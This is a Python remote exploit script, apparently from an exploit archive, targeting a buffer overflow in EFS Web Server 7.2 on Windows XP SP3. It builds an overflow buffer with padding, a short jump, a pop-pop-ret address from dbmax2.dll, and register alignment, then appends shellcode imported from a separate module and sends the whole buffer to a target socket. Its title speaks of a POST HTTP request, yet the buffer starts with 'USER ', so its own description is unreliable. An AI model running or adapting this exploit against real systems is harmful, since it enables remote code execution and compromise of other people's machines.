#!/usr/bin/python

# Title : EFS Web Server 7.2 POST HTTP Request Buffer Overflow
# Author : Touhid M.Shaikh
# Date : 12 June, 2017
# Contact: touhidshaikh22@gmail.com
# Version: 7.2
# category: Remote Exploit
# Tested on: Windows XP SP3 EN [Version 5.1.2600]





from payload import buf
import socket

import sys
def shell_attack(target_machine, target_port):
    try:
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target_machine,target_port))
        sock.recv(1024)
        

        buffer = b"USER "
        buffer += b"A" * 1439 # padding
        buffer += b"\xEB\x06\x90\x90" # Short jmp (6 bytes)
        buffer += b"\x86\xb3\x02\x10" # pop | pop | ret 1c , dbmax2.dll
        buffer += b"\x90" * 8 # nops (just to be sure)

        # popad's, so esp => shellcode
        buffer += b"\x61" * 145
        # nop's to align
        buffer += b"\x90" * 11
        # and ebx,esp
        buffer += b"\x21\xe3" 
        # or ebx,esp
        buffer += b"\x09\xe3" 
        # at this point, ebx = esp. The shellcode is lowercase (with numbers), baseaddr = EBX
        buffer += buf

        buffer += b"\x90" * 2000
        buffer += b"\r\n"
        
        sock.send(buffer)
        sock.close()
        
        sys.exit()
    except:
        pass    